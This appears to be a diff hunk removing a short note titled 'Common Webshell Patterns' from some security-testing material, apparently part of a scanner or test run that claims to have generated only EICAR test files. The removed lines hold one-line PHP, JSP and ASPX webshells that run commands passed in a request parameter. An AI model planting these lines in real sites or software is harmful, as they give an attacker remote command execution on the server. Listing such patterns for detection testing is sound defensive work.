@@ -1,7 +1,0 @@
-=== Common Webshell Patterns ===
-Testing for:
-  - PHP: <?php system($_GET['cmd']); ?>
-  - JSP: <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
-  - ASPX: <% eval(Request["cmd"]); %>
-
-Note: Only EICAR test files generated, no actual webshells
